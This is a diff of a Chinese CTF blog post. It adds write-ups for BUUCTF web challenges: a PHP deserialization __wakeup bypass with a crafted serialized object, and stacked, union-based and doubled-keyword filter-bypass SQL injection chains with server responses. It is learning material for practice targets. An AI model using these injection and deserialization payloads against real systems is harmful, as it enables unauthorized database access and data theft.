@@ -26,7 +26,7 @@
 <meta property="og:image" content="http://example.com/images/%E5%88%B7%E9%A2%98/buuctf(1).png">
 <meta property="og:image" content="http://example.com/images/%E5%88%B7%E9%A2%98/%E8%A7%A3%E6%9E%90%E6%9B%BF%E6%8D%A2.png">
 <meta property="article:published_time" content="2022-03-24T09:49:04.000Z">
-<meta property="article:modified_time" content="2022-04-04T16:39:44.039Z">
+<meta property="article:modified_time" content="2022-04-09T10:29:26.448Z">
 <meta property="article:author" content="7bmk">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary_large_image">
@@ -212,7 +212,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      4.2k 字
+      8.7k 字
     </span>
   
 
@@ -221,7 +221,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      35 分钟
+      73 分钟
     </span>
   
 
@@ -292,13 +292,48 @@
 <p>有点绕，没听懂，总之查阅多方资料后，这是个和http协议\反向代理服务器有关的漏洞</p>
 <p>至于具体原理，这个文章讲的8错，贴在这里—-<a target="_blank" rel="noopener" href="https://paper.seebug.org/1048/">链接</a><br>8得8感慨大佬们的脑洞真大…</p>
 <p>然后后续学习….感觉这是个挺大的知识点，于是就决定另水一贴</p>
-<h2 id="php-极客大挑战2019-网站的备份文件作业-amp-amp-反序列化之跳过"><a href="#php-极客大挑战2019-网站的备份文件作业-amp-amp-反序列化之跳过" class="headerlink" title="php 极客大挑战2019 (网站的备份文件作业 &amp;&amp; 反序列化之跳过)"></a>php 极客大挑战2019 (网站的备份文件作业 &amp;&amp; 反序列化之跳过)</h2><p>操了，忘了网站的备份文件这个知识点: <a target="_blank" rel="noopener" href="http://www.zip是网站的备份文件/">www.zip是网站的备份文件</a><br>然后根据提示，下载<a target="_blank" rel="noopener" href="http://www.zip文件,查看class.php/">www.zip文件，查看class.php</a>: </p>
+<h2 id="php-极客大挑战2019-网站的备份文件作业-amp-amp-反序化之-wakeup绕过"><a href="#php-极客大挑战2019-网站的备份文件作业-amp-amp-反序化之-wakeup绕过" class="headerlink" title="php 极客大挑战2019 (网站的备份文件作业 &amp;&amp; 反序化之__wakeup绕过)"></a>php 极客大挑战2019 (网站的备份文件作业 &amp;&amp; 反序化之__wakeup绕过)</h2><p>操了，忘了网站的备份文件这个知识点: <a target="_blank" rel="noopener" href="http://www.zip是网站的备份文件/">www.zip是网站的备份文件</a></p>
+<p>通过这题再学习一下php反序列化漏洞<br>然后根据提示，下载<a target="_blank" rel="noopener" href="http://www.zip文件,查看class.php(这里有个dirsearch的扫网站后台目录脚本阔以用一手)/">www.zip文件，查看class.php(这里有个dirsearch的扫网站后台目录脚本阔以用一手)</a>: </p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 <p>然后在index.php中有一段php代码，第一次看没看到…</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;<br>    <span class="hljs-variable">$select</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;select&#x27;</span>];<br>    <span class="hljs-variable">$res</span>=unserialize(@<span class="hljs-variable">$select</span>);<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>然后就阔以大致推测，get传过去的select经反序列化变成的res会被传到class.php中作为$this</p>
+<p>做法: 要调用__destruct函数才能显示flag，幸运的是php一般会主动调用这个函数，8需要我们调用<br>然后password要弱等于100，username要等于’admin’，这就有问题了，因为在反序列化时会调用__wake函数，而__wake函数会把username改了</p>
+<p>所以就需要绕过这个函数，怎么绕呢? 可以通过改变属性数绕过，原理是: 当序列化字符串中表示对象属性个数的数字值大于真实类中属性的个数时就会跳过__wakeup的执行</p>
+<p>所以我们构造payload: O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}<br>注意: 此处的%00是空字符，原因是$password和$username都是私有变量，因此在序列化时就会是这种格式</p>
 <h3 id="网站备份后缀作业"><a href="#网站备份后缀作业" class="headerlink" title="网站备份后缀作业"></a>网站备份后缀作业</h3><p>常见的备份文件后缀名： .git .svn .swp .~ .bak .bash_history<br>尝试是否存在index.php的备份。如index.php.bak</p>
+<p>但是有了扫目录的脚本后这些就显得很鸡肋啦!!</p>
+<h2 id="一些sql注入"><a href="#一些sql注入" class="headerlink" title="一些sql注入"></a>一些sql注入</h2><p>好久没做sql注入了，再来做一下，发现全忘了</p>
+<h3 id="SUCTF-2019-EasySQL1-从回显猜测查询语句，并根据查询语句进行拼接"><a href="#SUCTF-2019-EasySQL1-从回显猜测查询语句，并根据查询语句进行拼接" class="headerlink" title="[SUCTF 2019]EasySQL1  (从回显猜测查询语句，并根据查询语句进行拼接)"></a>[SUCTF 2019]EasySQL1  (从回显猜测查询语句，并根据查询语句进行拼接)</h3><p>这里需要根据回显来猜测sql语句</p>
+<p>首先，屏蔽了一些关键词: union “ information_schema<br>然后，用单引号无法闭合，且没有错误回显<br>此处可以用堆叠注入<br>query&#x3D;-1;show databases;<br>Array ( [0] &#x3D;&gt; 2 ) Array ( [0] &#x3D;&gt; ctf ) Array ( [0] &#x3D;&gt; ctftraining ) Array ( [0] &#x3D;&gt; information_schema ) Array ( [0] &#x3D;&gt; mysql ) Array ( [0] &#x3D;&gt; performance_schema ) Array ( [0] &#x3D;&gt; test ) </p>
+<p>query&#x3D;2;show 0x696e666f726d6174696f6e5f736368656d61<br>Too long.    &#x2F;&#x2F;太长了也会被屏蔽</p>
+<p>query&#x3D;-1;show tables;<br>Array ( [0] &#x3D;&gt; -1 ) Array ( [0] &#x3D;&gt; Flag ) </p>
+<p>由回显结果可知，用到了函数var_dump()</p>
+<p>然后猜测查询语句:<br>$sql &#x3D; “select “.$post[‘query’].”||flag from Flag”;<br>为什么有个||呢？因为在输入数字时回显的都是 Array([0]&#x3D;&gt;2)……</p>
+<p>于是就阔以构造payload了:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">1,*<br></code></pre></td></tr></table></figure>
+
+<p>其他解:<br>预期解: 通过修改SQL配置将或运算符||设置为连接符<br>set sql_mode&#x3D;PIPES_AS_CONCAT;<br>payload:<br>1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</p>
+<p>emmmmmmmm…..</p>
+<h3 id="极客大挑战-2019-LoveSQL-踩坑-url码中空格有时是-，有时是-20"><a href="#极客大挑战-2019-LoveSQL-踩坑-url码中空格有时是-，有时是-20" class="headerlink" title="[极客大挑战 2019]LoveSQL (踩坑: url码中空格有时是+，有时是%20)"></a>[极客大挑战 2019]LoveSQL (踩坑: url码中空格有时是+，有时是%20)</h3><p>比较简单，发现表单需要输入用户名和密码，于是猜测查询语句应该是:<br>select * from table1 where username&#x3D;$get[‘username’] and password&#x3D;$get[‘password’];<br>然后尝试闭合，发现怎么也闭合不了???<br>select * from table1 where username&#x3D;’1’ or 1&#x3D;1’ and password&#x3D;$password;</p>
+<p>后来发现hackbar真是垃圾….在payload正确的情况下，需要从网页输入框输入内容…否则浏览器里传的单引号、空格都是未转化为url的…<br>比如有些url码里空格是转化为%20，而有些则是转换为 + ，就会导致错误</p>
+<p>于是重新从输入框输入….<br>发现是1个”‘;”就能闭合</p>
+<p>?password&#x3D;1’ orderby 4<br>Unknown column ‘4’ in ‘order clause’</p>
+<p>可以查询3个<br>-1’ union select 1,2,group_concat(database());#<br>Your password is ‘geek’</p>
+<p>-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’geek’;#<br>Your password is ‘geekuser,l0ve1ysq1’</p>
+<p>-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’geekuser’;#<br>Your password is ‘id,username,password’</p>
+<p>-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’l0ve1ysq1’;#<br>Your password is ‘id,username,password</p>
+<p>嗯…..看来8在表里，再加上网页给的提示: “这群该死的黑客，竟然这么快就找到了我的flag,这次我把它们放在了那个地方，哼哼！”<br>那会在哪呢? 这我也想不到了，该看wp了</p>
+<p>嗯….wp看完了，flag就在表里，次奥<br>-1’ union select 1,2,group_concat(username,password) from l0ve1ysq1;#<br>Your password is ‘cl4ywo_tai_nan_le,glzjinglzjin_wants_a_girlfriend,Z4cHAr7zCrbiao_ge_dddd_hm,0xC4m3llinux_chuang_shi_ren,Ayraina_rua_rain,Akkoyan_shi_fu_de_mao_bo_he,fouc5cl4y,fouc5di_2_kuai_fu_ji,fouc5di_3_kuai_fu_ji,fouc5di_4_kuai_fu_ji,fouc5di_5_kuai_fu_ji,fouc5di_6_kuai_fu_ji,fouc5di_7_kuai_fu_ji,fouc5di_8_kuai_fu_ji,leixiaoSyc_san_da_hacker,flagflag{80a14653-2040-4e94-a550-31697e10e968}’</p>
+<h3 id="极客大挑战-2019-BabySQL-fuzz爆关键词注意409延时"><a href="#极客大挑战-2019-BabySQL-fuzz爆关键词注意409延时" class="headerlink" title="[极客大挑战 2019]BabySQL (fuzz爆关键词注意409延时)"></a>[极客大挑战 2019]BabySQL (fuzz爆关键词注意409延时)</h3><p>又是用户名加密码模式，还是有回显注入</p>
+<p>怎么闭合都是失败，回显的都是<br>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘1,2,3,4,5,6,7,8;#’ and password&#x3D;’456’’ at line 1<br>其实在这里就应该根据报错猜测是什么导致的…<br>wp是通过fuzz爆破关键词，发现order是报错的，于是就发现是双写绕过</p>
+<p>知道就好办了:<br>123’ ununionion seselectlect 1,2,3;#</p>
+<p>123’ ununionion seselectlect 1,2,database();#<br>Your password is ‘geek’</p>
+<p>123’ ununionion seselectlect 1,2,table_names frfromom information_schema.tables;#<br>Table ‘infmation_schema.tables’ doesn’t exist<br>123’ ununionion seselectlect 1,2,table_names frfromom inforormation_schema.tables;#<br>Table ‘infmation_schema.tables’ doesn’t exist<br>这里的information_schema怎么绕过呢? 看来8能用双写，大小写也8行</p>
+<p>试试16进制<br>0x696e666f726d6174696f6e5f736368656d612e7461626c6573<br>也8行….</p>
+<p>再动动脑子:<br>123’ ununionion seselectlect 1,2,table_name frfromom infoorrormation_schema.tables;#<br>Your password is ‘ALL_PLUGINS’    成功<br>-1’ ununionion seleselectct 1,2,column_name frofromm infoorrormation_schema.columns;#<br>Your password is ‘PLUGIN_NAME’<br>-1’ ununionion seleselectct 1,2,PLUGIN_NAME frofromm ALL_PLUGINS;#<br>Table ‘geek.ALL_PLUGINS’ doesn’t exist    ？？？</p>
+<p>看了看wp，发现忘了查询schema<br>-1’ ununionion seleselectct 1,2,schema_name frofromm infoorrormation_schema.schemata;#       &#x2F;&#x2F;注意这里是information_schema.schemata<br>Your password is ‘information_schema<br>-1’ ununionion seleselectct 1,2,group_concat(schema_name) frofromm infoorrormation_schema.schemata;#<br>Your password is ‘information_schema,mysql,performance_schema,test,ctf,geek’<br>-1’ ununionion seleselectct 1,2,group_concat(table_name) frofromm infoorrormation_schema.tables whewherere table_schema&#x3D;’ctf’;#<br>Your password is ‘Flag’<br>-1’ ununionion seleselectct 1,2,group_concat(column_name) frofromm infoorrormation_schema.columns whewherere table_name&#x3D;’Flag’;#<br>Your password is ‘flag’<br>-1’ ununionion seleselectct 1,2,flag frofromm ctf.Flag;#<br>得到flag</p>
 
             </div>
             <hr>
